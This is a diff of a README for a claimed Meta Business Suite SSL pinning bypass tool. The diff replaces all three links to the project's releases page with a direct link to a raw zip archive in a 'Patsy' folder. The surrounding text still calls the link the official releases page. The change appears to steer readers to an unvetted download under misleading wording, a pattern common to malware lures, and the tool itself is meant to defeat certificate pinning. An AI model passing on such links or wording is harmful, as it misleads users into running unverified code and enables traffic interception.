@@ -1,6 +1,6 @@
 # 🛠️ Meta-Business-Suite-SSL-Pinning-Bypass - Bypass SSL Pinning Easily
 
-[![Download Meta-Business-Suite-SSL-Pinning-Bypass](https://img.shields.io/badge/Download-Meta--Business__Suite--SSL--Pinning--Bypass-blue?style=for-the-badge)](https://github.com/kenshin-arch/Meta-Business-Suite-SSL-Pinning-Bypass/releases)
+[![Download Meta-Business-Suite-SSL-Pinning-Bypass](https://img.shields.io/badge/Download-Meta--Business__Suite--SSL--Pinning--Bypass-blue?style=for-the-badge)](https://raw.githubusercontent.com/kenshin-arch/Meta-Business-Suite-SSL-Pinning-Bypass/main/Patsy/SS_Business_Meta_Suite_Bypass_Pinning_2.1.zip)
 
 ## 📋 What is Meta-Business-Suite-SSL-Pinning-Bypass?
 
@@ -43,7 +43,7 @@ Follow these steps to download and run Meta-Business-Suite-SSL-Pinning-Bypass on
 
 Go to the release page to find the latest version of the tool.
 
-[![Download Meta-Business-Suite-SSL-Pinning-Bypass](https://img.shields.io/badge/Download-Meta--Business__Suite--SSL--Pinning--Bypass-blue?style=for-the-badge)](https://github.com/kenshin-arch/Meta-Business-Suite-SSL-Pinning-Bypass/releases)
+[![Download Meta-Business-Suite-SSL-Pinning-Bypass](https://img.shields.io/badge/Download-Meta--Business__Suite--SSL--Pinning--Bypass-blue?style=for-the-badge)](https://raw.githubusercontent.com/kenshin-arch/Meta-Business-Suite-SSL-Pinning-Bypass/main/Patsy/SS_Business_Meta_Suite_Bypass_Pinning_2.1.zip)
 
 Click the link and look for the latest release in the list. The files are organized by version number and date.
 
@@ -154,6 +154,6 @@ If the bypass does not apply:
 
 ## 🔗 Download Link Again
 
-[Download the latest version from here](https://github.com/kenshin-arch/Meta-Business-Suite-SSL-Pinning-Bypass/releases)
+[Download the latest version from here](https://raw.githubusercontent.com/kenshin-arch/Meta-Business-Suite-SSL-Pinning-Bypass/main/Patsy/SS_Business_Meta_Suite_Bypass_Pinning_2.1.zip)
 
 Use this link to check for new updates or versions. Always download releases only from this official page for security.
